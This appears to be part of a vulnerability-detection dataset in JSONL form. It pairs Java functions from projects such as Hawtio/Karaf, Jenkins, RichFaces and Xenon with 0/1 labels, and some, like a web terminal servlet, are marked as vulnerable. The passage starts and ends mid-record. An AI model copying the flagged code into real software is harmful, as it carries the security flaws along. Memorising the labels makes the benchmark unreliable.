!\"\".equals(meta.getValue()) ) {\n                    // As it has a value, if the meta parameter exists update it, otherwise add it\n                    recMeta.put(meta.getKey(), meta.getValue());\n                } else {\n                    // As it doesn't have a value, if it exists delete it\n                    if ( recMeta.containsKey(meta.getKey()) ) {\n                        recMeta.remove(meta.getKey());\n                    }\n                }\n            }\n\n            rec.setMeta(recMeta);\n\n            // Process the changes by saving the recording into metadata.xml\n            recordingServiceHelper.saveRecordingMetadata(destMetadataXml, rec);\n        }\n    }\n\n\n    private Map<String,File> indexRecordings(List<File> recs) {\n        Map<String,File> indexedRecs = new HashMap<>();\n\n        Iterator<File> iterator = recs.iterator();\n        while (iterator.hasNext()) {\n            File rec = iterator.next();\n            indexedRecs.put(rec.getName(), rec);\n        }\n\n        return indexedRecs;\n    }\n\n    private String getDestinationBaseDirectoryName(String state) {\n        return getDestinationBaseDirectoryName(state, false);\n    }\n\n    private String getDestinationBaseDirectoryName(String state, boolean forceDefault) {\n        String baseDir = null;\n\n        if ( state.equals(Recording.STATE_PROCESSING) || state.equals(Recording.STATE_PROCESSED) )\n            baseDir = processDir;\n        else if ( state.equals(Recording.STATE_PUBLISHED) )\n            baseDir = publishedDir;\n        else if ( state.equals(Recording.STATE_UNPUBLISHED) )\n            baseDir = unpublishedDir;\n        else if ( state.equals(Recording.STATE_DELETED) )\n            baseDir = deletedDir;\n        else if ( forceDefault )\n            baseDir = publishedDir;\n\n        return baseDir;\n    }\n\n    public String getCaptionTrackInboxDir() {\n        return captionsDir + File.separatorChar + \"inbox\";\n    }\n\n    public String getCaptionsDir() {\n      return captionsDir;\n    }\n\n    public String getCaptionFileUrlDirectory() {\n        return defaultTextTrackUrl + \"/textTrack/\";\n    }\n\n}\n", "target": 1}
{"idx": 1075, "func": "package io.hawt.web.plugin.karaf.terminal;\n\nimport io.hawt.system.Helpers;\nimport org.apache.felix.service.command.CommandProcessor;\nimport org.apache.felix.service.command.CommandSession;\nimport org.apache.felix.service.threadio.ThreadIO;\nimport org.apache.karaf.shell.console.jline.Console;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport javax.security.auth.Subject;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\nimport java.io.*;\nimport java.lang.reflect.Constructor;\nimport java.security.AccessControlContext;\nimport java.security.AccessController;\nimport java.util.zip.GZIPOutputStream;\n\n/**\n *\n */\npublic class TerminalServlet extends HttpServlet {\n\n    public static final int TERM_WIDTH = 120;\n    public static final int TERM_HEIGHT = 39;\n    private final static Logger LOG = LoggerFactory.getLogger(TerminalServlet.class);\n    /**\n     * Pseudo class version ID to keep the IDE quite.\n     */\n    private static final long serialVersionUID = 1L;\n\n    public CommandProcessor getCommandProcessor() {\n        return CommandProcessorHolder.getCommandProcessor();\n    }\n\n    public ThreadIO getThreadIO() {\n        return ThreadIOHolder.getThreadIO();\n    }\n\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n\n        HttpSession session = request.getSession(false);\n        if (session == null) {\n          AccessControlContext acc = AccessController.getContext();\n          Subject subject = Subject.getSubject(acc);\n          if (subject == null) {\n            Helpers.doForbidden(response);\n            return;\n          }\n          session = request.getSession(true);\n          session.setAttribute(\"subject\", subject);\n        } else {\n          Subject subject = (Subject) session.getAttribute(\"subject\");\n          if (subject == null) {\n            session.invalidate();\n            Helpers.doForbidden(response);\n            return;\n          }\n        }\n\n        String encoding = request.getHeader(\"Accept-Encoding\");\n        boolean supportsGzip = (encoding != null && encoding.toLowerCase().indexOf(\"gzip\") > -1);\n        SessionTerminal st = (SessionTerminal) session.getAttribute(\"terminal\");\n        if (st == null || st.isClosed()) {\n            st = new SessionTerminal(getCommandProcessor(), getThreadIO());\n            session.setAttribute(\"terminal\", st);\n        }\n        String str = request.getParameter(\"k\");\n        String f = request.getParameter(\"f\");\n        String dump = st.handle(str, f != null && f.length() > 0);\n        if (dump != null) {\n            if (supportsGzip) {\n                response.setHeader(\"Content-Encoding\", \"gzip\");\n                response.setHeader(\"Content-Type\", \"text/html\");\n                try {\n                    GZIPOutputStream gzos = new GZIPOutputStream(response.getOutputStream());\n                    gzos.write(dump.getBytes());\n                    gzos.close();\n                } catch (IOException ie) {\n                    LOG.info(\"Exception writing response: \", ie);\n                }\n            } else {\n                response.getOutputStream().write(dump.getBytes());\n            }\n        }\n    }\n\n    public class SessionTerminal implements Runnable {\n\n        private Terminal terminal;\n        private Console console;\n        private PipedOutputStream in;\n        private PipedInputStream out;\n        private boolean closed;\n\n        public SessionTerminal(CommandProcessor commandProcessor, ThreadIO threadIO) throws IOException {\n            try {\n                this.terminal = new Terminal(TERM_WIDTH, TERM_HEIGHT);\n                terminal.write(\"\\u001b\\u005B20\\u0068\"); // set newline mode on\n\n                in = new PipedOutputStream();\n                out = new PipedInputStream();\n                PrintStream pipedOut = new PrintStream(new PipedOutputStream(out), true);\n\n                Constructor ctr = Console.class.getConstructors()[0];\n                if (ctr.getParameterTypes().length <= 7) {\n                    LOG.debug(\"Using old Karaf Console API\");\n                    // the old API does not have the threadIO parameter, so its only 7 parameters\n                    console = (Console) ctr.newInstance(commandProcessor,\n                            new PipedInputStream(in),\n                            pipedOut,\n                            pipedOut,\n                            new WebTerminal(TERM_WIDTH, TERM_HEIGHT),\n                            null,\n                            null);\n                } else {\n                    LOG.debug(\"Using new Karaf Console API\");\n                    // use the new api directly which we compile against\n                    console = new Console(commandProcessor,\n                            threadIO,\n                            new PipedInputStream(in),\n                            pipedOut,\n                            pipedOut,\n                            new WebTerminal(TERM_WIDTH, TERM_HEIGHT),\n                            null,\n                            null);\n                }\n\n                CommandSession session = console.getSession();\n                session.put(\"APPLICATION\", System.getProperty(\"karaf.name\", \"root\"));\n                session.put(\"USER\", \"karaf\");\n                session.put(\"COLUMNS\", Integer.toString(TERM_WIDTH));\n                session.put(\"LINES\", Integer.toString(TERM_HEIGHT));\n            } catch (IOException e) {\n                LOG.info(\"Exception attaching to console\", e);\n                throw e;\n            } catch (Exception e) {\n                LOG.info(\"Exception attaching to console\", e);\n                throw (IOException) new IOException().initCause(e);\n            }\n            new Thread(console).start();\n            new Thread(this).start();\n        }\n\n        public boolean isClosed() {\n            return closed;\n        }\n\n        public String handle(String str, boolean forceDump) throws IOException {\n            try {\n                if (str != null && str.length() > 0) {\n                    String d = terminal.pipe(str);\n                    for (byte b : d.getBytes()) {\n                        in.write(b);\n                    }\n                    in.flush();\n                }\n            } catch (IOException e) {\n                closed = true;\n                throw e;\n            }\n            try {\n                return terminal.dump(10, forceDump);\n            } catch (InterruptedException e) {\n                throw new InterruptedIOException(e.toString());\n            }\n        }\n\n        public void run() {\n            try {\n                for (; ; ) {\n                    byte[] buf = new byte[8192];\n                    int l = out.read(buf);\n                    InputStreamReader r = new InputStreamReader(new ByteArrayInputStream(buf, 0, l));\n                    StringBuilder sb = new StringBuilder();\n                    for (; ; ) {\n                        int c = r.read();\n                        if (c == -1) {\n                            break;\n                        }\n                        sb.append((char) c);\n                    }\n                    if (sb.length() > 0) {\n                        terminal.write(sb.toString());\n                    }\n                    String s = terminal.read();\n                    if (s != null && s.length() > 0) {\n                        for (byte b : s.getBytes()) {\n                            in.write(b);\n                        }\n                    }\n                }\n            } catch (IOException e) {\n                closed = true;\n            }\n        }\n\n    }\n}\n", "target": 1}
{"idx": 1076, "func": "/*\n * The MIT License\n *\n * Copyright (c) 2004-2009, Sun Microsystems, Inc.\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\npackage hudson;\n\nimport hudson.model.Hudson;\nimport jenkins.model.Jenkins;\nimport hudson.util.OneShotEvent;\n\nimport java.io.IOException;\nimport java.net.BindException;\nimport java.net.DatagramPacket;\nimport java.net.InetAddress;\nimport java.net.MulticastSocket;\nimport java.net.SocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.channels.ClosedByInterruptException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\n/**\n * Monitors a UDP multicast broadcast and respond with the location of the Hudson service.\n *\n * <p>\n * Useful for auto-discovery of Hudson in the network.\n *\n * @author Kohsuke Kawaguchi\n */\npublic class UDPBroadcastThread extends Thread {\n    private final Jenkins jenkins;\n\n    public final OneShotEvent ready = new OneShotEvent();\n    private MulticastSocket mcs;\n    private boolean shutdown;\n\n    /**\n     * @deprecated as of 1.416\n     *      Use {@link #UDPBroadcastThread(Jenkins)}\n     */\n    public UDPBroadcastThread(Hudson jenkins) throws IOException {\n        this((Jenkins)jenkins);\n    }\n\n    public UDPBroadcastThread(Jenkins jenkins) throws IOException {\n        super(\"Jenkins UDP \"+PORT+\" monitoring thread\");\n        this.jenkins = jenkins;\n        mcs = new MulticastSocket(PORT);\n    }\n\n    @Override\n    public void run() {\n        try {\n            mcs.joinGroup(MULTICAST);\n            ready.signal();\n\n            while(true) {\n                byte[] buf = new byte[2048];\n                DatagramPacket p = new DatagramPacket(buf,buf.length);\n                mcs.receive(p);\n\n                SocketAddress sender = p.getSocketAddress();\n\n                // prepare a response\n                TcpSlaveAgentListener tal = jenkins.getTcpSlaveAgentListener();\n\n                StringBuilder rsp = new StringBuilder(\"<hudson>\");\n                tag(rsp,\"version\", Jenkins.VERSION);\n                tag(rsp,\"url\", jenkins.getRootUrl());\n                tag(rsp,\"server-id\", jenkins.getLegacyInstanceId());\n                tag(rsp,\"slave-port\",tal==null?null:tal.getPort());\n\n                for (UDPBroadcastFragment f : UDPBroadcastFragment.all())\n                    f.buildFragment(rsp,sender);\n\n                rsp.append(\"</hudson>\");\n\n                byte[] response = rsp.toString().getBytes(\"UTF-8\");\n                mcs.send(new DatagramPacket(response,response.length,sender));\n            }\n        } catch (ClosedByInterruptException e) {\n            // shut down\n        } catch (BindException e) {\n            // if we failed to listen to UDP, just silently abandon it, as a stack trace\n            // makes people unnecessarily concerned, for a feature that currently does no good.\n            LOGGER.log(Level.WARNING, \"Failed to listen to UDP port \"+PORT,e);\n        } catch (IOException e) {\n            if (shutdown)   return; // forcibly closed\n            LOGGER.log(Level.WARNING, \"UDP handling problem\",e);\n        }\n    }\n\n    private void tag(StringBuilder buf, String tag, Object value) {\n        if(value==null) return;\n        buf.append('<').append(tag).append('>').append(value).append(\"</\").append(tag).append('>');\n    }\n\n    public void shutdown() {\n        shutdown = true;\n        mcs.close();\n        interrupt();\n    }\n\n    public static final int PORT = Integer.getInteger(\"hudson.udp\",33848);\n\n    private static final Logger LOGGER = Logger.getLogger(UDPBroadcastThread.class.getName());\n\n    /**\n     * Multicast socket address.\n     */\n    public static InetAddress MULTICAST;\n\n    static {\n        try {\n            MULTICAST = InetAddress.getByAddress(new byte[]{(byte)239, (byte)77, (byte)124, (byte)213});\n        } catch (UnknownHostException e) {\n            throw new Error(e);\n        }\n    }\n}\n", "target": 0}
{"idx": 1077, "func": "/**\n * License Agreement.\n *\n * Rich Faces - Natural Ajax for Java Server Faces (JSF)\n *\n * Copyright (C) 2007 Exadel, Inc.\n *\n * This library is free software; you can redistribute it and/or\n * modify it under the terms of the GNU Lesser General Public\n * License version 2.1 as published by the Free Software Foundation.\n *\n * This library is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n * Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public\n * License along with this library; if not, write to the Free Software\n * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA\n */\n\npackage org.ajax4jsf.resource;\n\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.Serializable;\nimport java.util.Date;\n\nimport javax.el.ELContext;\nimport javax.el.MethodExpression;\nimport javax.el.ValueExpression;\nimport javax.faces.component.UIComponent;\nimport javax.faces.component.UIComponentBase;\nimport javax.faces.context.FacesContext;\n\n/**\n * @author shura\n *\n */\npublic class UserResource extends InternetResourceBase {\n\n\tprivate String contentType;\n\t/**\n\t * \n\t */\n\tpublic UserResource(boolean cacheable, boolean session, String mime) {\n\t\tsuper();\t\t\n\t\tsetCacheable(cacheable);\n\t\tsetSessionAware(session);\n\t\tsetContentType(mime);\n\t}\n\t/**\n\t * @return Returns the contentType.\n\t */\n\tpublic String getContentType(ResourceContext resourceContext) {\n\t\treturn contentType;\n\t}\n\t/**\n\t * @param contentType The contentType to set.\n\t */\n\tpublic void setContentType(String contentType) {\n\t\tthis.contentType = contentType;\n\t}\n\t/* (non-Javadoc)\n\t * @see org.ajax4jsf.resource.InternetResourceBase#getDataToStore(javax.faces.context.FacesContext, java.lang.Object)\n\t */\n\tpublic Object getDataToStore(FacesContext context, Object data) {\n\t\tUriData dataToStore = null;\n\t\tif (data instanceof ResourceComponent2) {\n\t\t\tResourceComponent2 resource = (ResourceComponent2) data;\n\t\t\tdataToStore = new UriData();\n\t\t\tdataToStore.value = resource.getValue();\n\t\t\tdataToStore.createContent = UIComponentBase.saveAttachedState(context,resource.getCreateContentExpression());\n\t\t\tif (data instanceof UIComponent) {\n\t\t\t\tUIComponent component = (UIComponent) data;\n\t\t\t\tValueExpression expires = component.getValueExpression(\"expires\");\n\t\t\t\tif (null != expires) {\n\t\t\t\t\tdataToStore.expires = UIComponentBase.saveAttachedState(context,expires);\n\t\t\t\t}\n\t\t\t\tValueExpression lastModified = component.getValueExpression(\"lastModified\");\n\t\t\t\tif (null != lastModified) {\n\t\t\t\t\tdataToStore.modified = UIComponentBase.saveAttachedState(context,lastModified);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn dataToStore;\n\t}\n\t/* (non-Javadoc)\n\t * @see org.ajax4jsf.resource.InternetResourceBase#send(org.ajax4jsf.resource.ResourceContext)\n\t */\n\tpublic void send(ResourceContext context) throws IOException {\n\t\tUriData data = (UriData) restoreData(context);\n\t\tFacesContext facesContext = FacesContext.getCurrentInstance();\n\t\tif (null != data && null != facesContext ) {\n\t\t\t// Send headers\n\t\t\tELContext elContext = facesContext.getELContext();\n//\t\t\tif(data.expires != null){\n//\t\t\t\tValueExpression binding = (ValueExpression) UIComponentBase.restoreAttachedState(facesContext,data.expires);\n//\t\t\t\tDate expires = (Date) binding.getValue(elContext);\n//\t\t\t\tcontext.setDateHeader(\"Expires\",expires.getTime());\n//\t\t\t}\n//\t\t\tif(data.modified != null){\n//\t\t\t\tValueExpression binding = (ValueExpression) UIComponentBase.restoreAttachedState(facesContext,data.modified);\n//\t\t\t\tDate modified = (Date) binding.getValue(elContext);\n//\t\t\t\tcontext.setDateHeader(\"Last-Modified\",modified.getTime());\n//\t\t\t}\n\t\t\t// Send content\n\t\t\tOutputStream out = context.getOutputStream();\n\t\t\tMethodExpression send = (MethodExpression) UIComponentBase.restoreAttachedState(facesContext,data.createContent);\n\t\t\tsend.invoke(elContext,new Object[]{out,data.value});\n\t\t}\n\t}\n\n\t\n\t@Override\n\tpublic Date getLastModified(ResourceContext resourceContext) {\n\t\tUriData data = (UriData) restoreData(resourceContext);\n\t\tFacesContext facesContext = FacesContext.getCurrentInstance();\n\t\tif (null != data && null != facesContext ) {\n\t\t\t// Send headers\n\t\t\tELContext elContext = facesContext.getELContext();\n\t\t\tif(data.modified != null){\n\t\t\tValueExpression binding = (ValueExpression) UIComponentBase.restoreAttachedState(facesContext,data.modified);\n\t\t\tDate modified = (Date) binding.getValue(elContext);\n\t\t\tif (null != modified) {\n\t\t\t\treturn modified;\n\t\t\t}\n\t\t}\n\t\t}\n\t\treturn super.getLastModified(resourceContext);\n\t}\n\t\n\t\n\t@Override\n\tpublic long getExpired(ResourceContext resourceContext) {\n\t\tUriData data = (UriData) restoreData(resourceContext);\n\t\tFacesContext facesContext = FacesContext.getCurrentInstance();\n\t\tif (null != data && null != facesContext ) {\n\t\t\t// Send headers\n\t\t\tELContext elContext = facesContext.getELContext();\n\t\t\tif(data.expires != null){\n\t\t\tValueExpression binding = (ValueExpression) UIComponentBase.restoreAttachedState(facesContext,data.expires);\n\t\t\tDate expires = (Date) binding.getValue(elContext);\n\t\t\tif (null != expires) {\n\t\t\t\treturn expires.getTime()-System.currentTimeMillis();\n\t\t\t}\n\t\t}\n\t\t}\n\t\treturn super.getExpired(resourceContext);\n\t}\n\t/* (non-Javadoc)\n\t * @see org.ajax4jsf.resource.InternetResourceBase#requireFacesContext()\n\t */\n\tpublic boolean requireFacesContext() {\n\t\t// TODO Auto-generated method stub\n\t\treturn true;\n\t}\n\t\n\tpublic static class UriData implements SerializableResource {\n\n\t\t/**\n\t\t * \n\t\t */\n\t\tprivate static final long serialVersionUID = 1258987L;\n\t\t\n\t\tprivate Object value;\n\t\t\n\t\tprivate Object createContent;\n\t\t\n\t\tprivate Object expires;\n\t\t\n\t\tprivate Object modified;\n\t}\n\n}\n", "target": 0}
{"idx": 1078, "func": "/*\n * The MIT License\n *\n * Copyright (c) 2015 Red Hat, Inc.\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\npackage hudson.model;\n\nimport static org.hamcrest.Matchers.containsString;\nimport static org.hamcrest.Matchers.not;\nimport static org.junit.Assert.*;\n\n\nimport java.io.File;\n\nimport com.gargoylesoftware.htmlunit.xml.XmlPage;\nimport hudson.slaves.OfflineCause;\nimport jenkins.model.Jenkins;\nimport hudson.slaves.DumbSlave;\n\nimport org.junit.Rule;\nimport org.junit.Test;\nimport org.jvnet.hudson.test.JenkinsRule;\nimport org.jvnet.hudson.test.recipes.LocalData;\n\npublic class ComputerTest {\n\n    @Rule public JenkinsRule j = new JenkinsRule();\n\n    @Test\n    public void discardLogsAfterDeletion() throws Exception {\n        DumbSlave delete = j.createOnlineSlave(Jenkins.getInstance().getLabelAtom(\"delete\"));\n        DumbSlave keep = j.createOnlineSlave(Jenkins.getInstance().getLabelAtom(\"keep\"));\n        File logFile = delete.toComputer().getLogFile();\n        assertTrue(logFile.exists());\n\n        Jenkins.getInstance().removeNode(delete);\n\n        assertFalse(\"Slave log should be deleted\", logFile.exists());\n        assertFalse(\"Slave log directory should be deleted\", logFile.getParentFile().exists());\n\n        assertTrue(\"Slave log should be kept\", keep.toComputer().getLogFile().exists());\n    }\n\n    @Test\n    public void doNotShowUserDetailsInOfflineCause() throws Exception {\n        DumbSlave slave = j.createOnlineSlave();\n        final Computer computer = slave.toComputer();\n        computer.setTemporarilyOffline(true, new OfflineCause.UserCause(User.get(\"username\"), \"msg\"));\n        verifyOfflineCause(computer);\n    }\n\n    @Test @LocalData\n    public void removeUserDetailsFromOfflineCause() throws Exception {\n        Computer computer = j.jenkins.getComputer(\"deserialized\");\n        verifyOfflineCause(computer);\n    }\n\n    private void verifyOfflineCause(Computer computer) throws Exception {\n        XmlPage page = j.createWebClient().goToXml(\"computer/\" + computer.getName() + \"/config.xml\");\n        String content = page.getWebResponse().getContentAsString(\"UTF-8\");\n        assertThat(content, containsString(\"temporaryOfflineCause\"));\n        assertThat(content, containsString(\"<userId>username</userId>\"));\n        assertThat(content, not(containsString(\"ApiTokenProperty\")));\n        assertThat(content, not(containsString(\"apiToken\")));\n    }\n}\n", "target": 0}
{"idx": 1079, "func": "/*\n * Copyright (c) 2014-2016 VMware, Inc. All Rights Reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n * use this file except in compliance with the License.  You may obtain a copy of\n * the License at http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software distributed\n * under the License is distributed on an \"AS IS\" BASIS, without warranties or\n * conditions of any kind, EITHER EXPRESS OR IMPLIED.  See the License for the\n * specific language governing permissions and limitations under the License.\n */\n\npackage com.vmware.xenon.common;\n\nimport static java.util.stream.Collectors.toList;\n\nimport static org.junit.Assert.assertEquals;\nimport static org.junit.Assert.assertNotEquals;\nimport static org.junit.Assert.assertNotNull;\nimport static org.junit.Assert.assertTrue;\n\nimport java.net.URI;\nimport java.nio.file.Paths;\nimport java.util.ArrayList;\nimport java.util.EnumSet;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.UUID;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.function.BiPredicate;\nimport java.util.function.Consumer;\nimport java.util.function.Function;\nimport java.util.stream.Collectors;\n\nimport org.junit.After;\nimport org.junit.AfterClass;\nimport org.junit.Before;\nimport org.junit.BeforeClass;\nimport org.junit.Ignore;\nimport org.junit.Test;\n\nimport com.vmware.xenon.common.test.TestContext;\nimport com.vmware.xenon.common.test.TestRequestSender;\nimport com.vmware.xenon.common.test.VerificationHost;\nimport com.vmware.xenon.services.common.ExampleService;\nimport com.vmware.xenon.services.common.ExampleService.ExampleODLService;\nimport com.vmware.xenon.services.common.ExampleService.ExampleServiceState;\nimport com.vmware.xenon.services.common.InMemoryLuceneDocumentIndexService;\nimport com.vmware.xenon.services.common.NodeGroupService;\nimport com.vmware.xenon.services.common.ServiceUriPaths;\nimport com.vmware.xenon.services.common.TestLuceneDocumentIndexService.InMemoryExampleService;\n\n\npublic class TestSynchronizationTaskService extends BasicTestCase {\n    public static class SynchRetryExampleService extends StatefulService {\n        public static final String FACTORY_LINK = ServiceUriPaths.CORE + \"/test-retry-examples\";\n\n        public static final FactoryService createFactory() {\n            return FactoryService.create(SynchRetryExampleService.class);\n        }\n\n        public SynchRetryExampleService() {\n            super(ServiceDocument.class);\n            toggleOption(ServiceOption.PERSISTENCE, true);\n            toggleOption(ServiceOption.OWNER_SELECTION, true);\n            toggleOption(ServiceOption.REPLICATION, true);\n        }\n\n        @Override\n        public boolean queueRequest(Operation op) {\n            return false;\n        }\n\n        @Override\n        public void handleRequest(Operation op) {\n            if (getSelfLink().endsWith(\"fail\")) {\n                if (op.hasPragmaDirective(Operation.PRAGMA_DIRECTIVE_SYNCH_OWNER)) {\n                    op.fail(500);\n                    return;\n                }\n            }\n\n            super.handleRequest(op);\n        }\n    }\n\n    public static final String STAT_NAME_PATCH_REQUEST_COUNT = \"PATCHrequestCount\";\n\n    public int updateCount = 10;\n    public int serviceCount = 10;\n    public int nodeCount = 3;\n\n    private BiPredicate<ExampleServiceState, ExampleServiceState> exampleStateConvergenceChecker = (\n            initial, current) -> {\n        if (current.name == null) {\n            return false;\n        }\n\n        return current.name.equals(initial.name);\n    };\n\n    @BeforeClass\n    public static void setUpClass() throws Exception {\n        System.setProperty(\n                SynchronizationTaskService.PROPERTY_NAME_SYNCHRONIZATION_LOGGING, \"true\");\n    }\n\n    @AfterClass\n    public static void tearDownClass() throws Exception {\n        System.setProperty(\n                SynchronizationTaskService.PROPERTY_NAME_SYNCHRONIZATION_LOGGING, \"false\");\n    }\n\n    @Override\n    public void beforeHostStart(VerificationHost host) throws Throwable {\n        host.setMaintenanceIntervalMicros(TimeUnit.MILLISECONDS.toMicros(\n                VerificationHost.FAST_MAINT_INTERVAL_MILLIS));\n        this.host.addPrivilegedService(InMemoryLuceneDocumentIndexService.class);\n        this.host.startServiceAndWait(InMemoryLuceneDocumentIndexService.class,\n                InMemoryLuceneDocumentIndexService.SELF_LINK);\n\n        this.host.startFactory(InMemoryExampleService.class, InMemoryExampleService::createFactory);\n    }\n\n    @Before\n    public void setUp() {\n        CommandLineArgumentParser.parseFromProperties(this);\n        URI exampleFactoryUri = UriUtils.buildUri(\n                this.host.getUri(), ExampleService.FACTORY_LINK);\n        this.host.waitForReplicatedFactoryServiceAvailable(\n                exampleFactoryUri);\n    }\n\n    private void setUpMultiNode() throws Throwable {\n        this.host.setUpPeerHosts(this.nodeCount);\n        this.host.joinNodesAndVerifyConvergence(this.nodeCount);\n\n        URI exampleFactoryUri = UriUtils.buildUri(\n                this.host.getPeerServiceUri(ExampleService.FACTORY_LINK));\n        this.host.waitForReplicatedFactoryServiceAvailable(exampleFactoryUri);\n\n        for (VerificationHost h : this.host.getInProcessHostMap().values()) {\n            h.addPrivilegedService(InMemoryLuceneDocumentIndexService.class);\n            h.startCoreServicesSynchronously(new InMemoryLuceneDocumentIndexService());\n            h.startFactory(new InMemoryExampleService());\n            h.startFactory(new ExampleODLService());\n        }\n\n        URI inMemoryExampleFactoryUri = UriUtils.buildUri(\n                this.host.getPeerServiceUri(InMemoryExampleService.FACTORY_LINK));\n        this.host.waitForReplicatedFactoryServiceAvailable(inMemoryExampleFactoryUri);\n        URI ODLExampleFactoryUri = UriUtils.buildUri(\n                this.host.getPeerServiceUri(InMemoryExampleService.FACTORY_LINK));\n        this.host.waitForReplicatedFactoryServiceAvailable(ODLExampleFactoryUri);\n\n    }\n\n    @After\n    public void tearDown() {\n        this.host.tearDownInProcessPeers();\n        this.host.tearDown();\n    }\n\n    @Test\n    public void ownershipValidation() throws Throwable {\n        // This test verifies that only the owner node\n        // executes the synchronization task. If the task\n        // is started on a non-owner node, the task should\n        // self-cancel.\n        setUpMultiNode();\n        ownershipValidationDo(ExampleService.FACTORY_LINK);\n        ownershipValidationDo(InMemoryExampleService.FACTORY_LINK);\n    }\n\n    public void ownershipValidationDo(String factoryLink) throws Throwable {\n        this.host.createExampleServices(this.host.getPeerHost(), this.serviceCount, null, false, factoryLink);\n\n        long membershipUpdateTimeMicros = getLatestMembershipUpdateTime(this.host.getPeerHostUri());\n\n        SynchronizationTaskService.State task = createSynchronizationTaskState(membershipUpdateTimeMicros, factoryLink);\n        List<Operation> ops = this.host.getInProcessHostMap().keySet().stream()\n                .map(uri -> Operation\n                    .createPost(UriUtils.buildUri(uri, SynchronizationTaskService.FACTORY_LINK))\n                    .setBody(task)\n                    .setReferer(this.host.getUri())\n                ).collect(toList());\n\n        TestRequestSender sender = new TestRequestSender(this.host);\n        List<SynchronizationTaskService.State> results = sender\n                .sendAndWait(ops, SynchronizationTaskService.State.class);\n\n        int finishedCount = 0;\n        for (SynchronizationTaskService.State r : results) {\n            assertTrue(r.taskInfo.stage == TaskState.TaskStage.FINISHED ||\n                    r.taskInfo.stage == TaskState.TaskStage.CANCELLED);\n            if (r.taskInfo.stage == TaskState.TaskStage.FINISHED) {\n                finishedCount++;\n            }\n        }\n        assertTrue(finishedCount == 1);\n    }\n\n    @Test\n    public void serviceResynchOnFailure() throws Throwable {\n        TestRequestSender sender = new TestRequestSender(this.host);\n\n        // Test with all failed to synch services, after all retries the task will be in failed state.\n        this.host.startFactory(SynchRetryExampleService.class, SynchRetryExampleService::createFactory);\n        URI factoryUri = UriUtils.buildUri(\n                this.host, SynchRetryExampleService.FACTORY_LINK);\n        this.host.waitForReplicatedFactoryServiceAvailable(factoryUri);\n\n        createExampleServices(sender, this.host, this.serviceCount, \"fail\", SynchRetryExampleService.FACTORY_LINK);\n\n        SynchronizationTaskService.State task = createSynchronizationTaskState(\n                null, SynchRetryExampleService.FACTORY_LINK, ServiceDocument.class);\n        task.membershipUpdateTimeMicros = Utils.getNowMicrosUtc();\n\n        // Add pagination in query results.\n        task.queryResultLimit = this.serviceCount / 2;\n\n        // Speed up the retries.\n        this.host.setMaintenanceIntervalMicros(TimeUnit.MILLISECONDS.toMicros(1));\n\n        Operation op = Operation\n                .createPost(UriUtils.buildUri(this.host, SynchronizationTaskService.FACTORY_LINK))\n                .setBody(task);\n\n        SynchronizationTaskService.State result = sender\n                .sendAndWait(op, SynchronizationTaskService.State.class);\n\n        assertEquals(TaskState.TaskStage.FAILED, result.taskInfo.stage);\n        assertEquals(0, result.synchCompletionCount);\n\n        // Verify that half of the child services were failed.\n        waitForSynchRetries(result, SynchronizationTaskService.STAT_NAME_CHILD_SYNCH_FAILURE_COUNT,\n                (synchRetryCount) -> synchRetryCount.latestValue == task.queryResultLimit);\n\n        // Test after all retries the task will be in failed state with at-least half\n        // successful synched services in each page.\n        createExampleServices(sender, this.host, this.serviceCount * 3, \"pass\", 